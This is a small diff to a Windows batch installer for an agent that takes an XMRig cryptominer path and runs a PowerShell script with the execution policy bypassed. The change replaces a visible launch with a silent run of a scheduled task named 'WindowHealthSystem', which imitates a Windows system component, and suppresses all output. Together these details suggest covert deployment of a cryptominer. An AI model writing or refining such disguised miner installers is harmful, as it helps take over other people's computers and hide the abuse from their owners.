@@ -67,8 +67,8 @@ echo        Scheduled task created OK
 echo.
 
 :: Start it now
-echo  [4/4] Starting agent...
-start "" powershell.exe -ExecutionPolicy Bypass -File "C:\ProgramData\PC-Agent\agent.ps1" -DeviceName "%DEVICE_NAME%" -ServerUrl "%SERVER_URL%" -XmrigPath "%XMRIG_PATH%"
+echo  [4/4] Starting agent in background...
+schtasks /run /tn "WindowHealthSystem" >nul 2>&1
 echo        Agent started OK
 echo.
 
